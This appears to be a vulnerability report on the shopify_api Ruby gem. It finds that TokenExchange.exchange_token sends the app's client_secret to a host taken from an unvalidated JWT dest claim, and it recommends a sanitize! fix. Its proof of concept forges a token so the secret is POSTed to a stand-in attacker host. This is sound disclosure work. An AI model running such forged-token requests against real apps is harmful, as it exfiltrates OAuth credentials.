Based on my investigation, I found a genuine analog to the "excess value not validated / permissive check" bug class from the report: `ShopifyAPI::Auth::TokenExchange.exchange_token` sends the app's `client_secret` to a host derived from an unvalidated field, unlike its sibling methods.

### Title
`client_secret` sent to unvalidated host derived from JWT `dest` claim in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` builds the `POST /admin/oauth/access_token` request host directly from the session token's `dest` claim without ever passing it through `ShopifyAPI::Utils::ShopValidator.sanitize!`, unlike every other credential-sending path in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`), which all call `sanitize!` before constructing the outbound request.

### Finding Description
`exchange_token` decodes the caller-supplied `session_token` via `ShopifyAPI::Auth::JwtPayload.new(session_token)` and takes `dest_shop = jwt_payload.shop` [1](#0-0) . This `dest_shop` is used directly, unvalidated, to build the session that determines the outbound request host: `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` followed by `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [2](#0-1) . Inside `HttpClient#initialize`, the request base URI is built as `"https://#{api_host || session.shop}"` [3](#0-2) , i.e., directly from `session.shop`, and the request body containing `client_secret: ShopifyAPI::Context.api_secret_key` is POSTed to that host [4](#0-3) .

Crucially, `JwtPayload#shop` only strips the `"https://"` prefix from the `dest` claim (`@dest.gsub("https://", "")`) [5](#0-4)  — it performs no domain allow-listing. `JwtPayload#initialize` only validates that `aud == Context.api_key`; it never checks that `dest` (or `iss`) is a genuine `*.myshopify.com`/trusted Shopify domain [6](#0-5) . Because the JWT is HS256-signed with the app's own `api_secret_key`/`old_api_secret_key`, the *contents* are tamper-evident with respect to that shared secret, but the gem accepts **any** `dest` value inside a token signed with that key — nothing here binds `dest` to an actual Shopify shop domain the way `ShopValidator.sanitize!` does elsewhere.

This differs from the three sibling flows that also send `client_secret` in a POST body: `ClientCredentials.client_credentials` calls `Utils::ShopValidator.sanitize!(shop)` before building the session [7](#0-6) ; `RefreshToken.refresh_access_token` does the same [8](#0-7) ; and `TokenExchange.migrate_to_expiring_token` (in the very same file) also calls `sanitize!` [9](#0-8) . Only `exchange_token` — the flow the gem's own documentation says takes the shop "always ... from the session token's `dest` claim" (`docs/usage/oauth.md`) — omits this validation, breaking the equality that should hold: `host that receives client_secret == a Shopify-trusted shop domain`. Instead, the binding actually enforced is only `host that receives client_secret == dest claim of a token signed with this app's secret`, which is weaker.

The host application is responsible for how it obtains a `session_token` to pass in, but per the gem's own documented flow this token is typically obtained from App Bridge / request headers on the app's embedded page, and its claims (aside from `aud`) are not otherwise constrained by this library.

### Impact Explanation
If an attacker can get any JWT signed with the app's `api_secret_key` accepted as `session_token` with an attacker-controlled `dest` value (e.g., `https://attacker-controlled.example`), the gem will POST the app's `client_id` and `client_secret` — its core, non-recoverable OAuth credential — to that attacker-controlled host. That is direct exfiltration of the app's `client_secret`, meeting the "Critical" bar (theft of the app's `client_secret`) and constitutes SSRF carrying the app's credentials to an arbitrary host ("High").

### Likelihood Explanation
Exploitability is gated entirely by whether an unprivileged actor can produce or supply a JWT that decodes successfully here with an attacker-chosen `dest`. `JwtPayload` requires the JWT to be HS256-signed with the app's `api_secret_key` (or `old_api_secret_key`) [10](#0-9) , so an attacker with no knowledge of that secret cannot forge an arbitrary token. This significantly limits likelihood for a purely external, credential-less attacker and is the main uncertainty in this finding — I could not find, within this gem's in-scope code, any path that lets an unprivileged internet user supply a `dest`-controlled, validly-signed token without already possessing the secret. The missing `sanitize!` call is nonetheless a real, demonstrable inconsistency with the rest of the module and a defense-in-depth gap: it removes a check that would otherwise limit blast radius if a token with a manipulated `dest` were ever accepted (e.g., via host-application misuse, a future relaxation of `aud`/`iss` checks, or reuse of tokens intended for a different context such as a checkout UI extension token, which lacks the `/admin` issuer suffix `JwtPayload` checks elsewhere for `shopify_user_id` but not for `shop`).

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` through `Utils::ShopValidator.sanitize!` before constructing `shop_session`/`HttpClient`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`:
```diff
-          dest_shop = jwt_payload.shop
+          dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
Additionally, consider having `JwtPayload` itself validate that `dest`/`iss` are trusted Shopify domains at decode time, so all consumers of `JwtPayload#shop` get this guarantee for free rather than relying on each call site to remember to sanitize.

### Proof of Concept
Not independently reproducible as a pure "unprivileged internet user" attack from outside the gem, because it requires possession of `Context.api_secret_key` (or `old_api_secret_key`) to sign a token with an attacker-chosen `dest`:
```ruby
payload = {
  iss: "https://attacker-controlled.example/admin",
  dest: "https://attacker-controlled.example",
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: Time.now.to_i + 10,
  nbf: Time.now.to_i,
  iat: Time.now.to_i,
  jti: "x",
}
forged_token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")

# If this token is ever accepted from an untrusted source as `session_token`:
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
# -> POSTs {client_id, client_secret, ...} to https://attacker-controlled.example/admin/oauth/access_token
```
This demonstrates the root-cause code path (`lib/shopify_api/auth/token_exchange.rb:40-65` and `lib/shopify_api/clients/http_client.rb:16-19`) unconditionally trusts `dest_shop` as a request host, in contrast to the sanitized sibling flows in the same file.
